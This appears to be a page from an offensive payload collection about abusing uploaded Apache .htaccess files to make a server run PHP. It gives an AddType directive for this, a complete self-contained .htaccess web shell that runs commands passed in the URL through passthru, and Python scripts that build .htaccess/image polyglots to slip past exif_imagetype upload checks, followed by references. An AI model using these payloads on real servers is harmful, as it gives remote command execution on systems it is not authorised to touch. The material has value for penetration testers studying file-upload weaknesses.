# .htaccess

Uploading an .htaccess file to override Apache rule and execute PHP.
"Hackers can also use “.htaccess” file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerabler server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded."

## Summary

* [AddType Directive](#addtype-directive)
* [Self Contained .htaccess](#self-contained-htaccess)
* [Polyglot .htaccess](#polyglot-htaccess)
* [References](#references)


## AddType Directive

Upload an .htaccess with : `AddType application/x-httpd-php .rce`   
Then upload any file with `.rce` extension.


## Self Contained .htaccess

```python
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directives from the .htaccess file
AddType application/x-httpd-php .htaccess
```

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```


## Polyglot .htaccess

If the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot. 

[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In `.htaccess` ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid `.htaccess/image` polyglot.


* Create valid `.htaccess/xbm` image
    ```python
    width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
    ```

* Create valid `.htaccess/wbmp` image
    ```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess file'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
    ```


## References

* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015 ](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
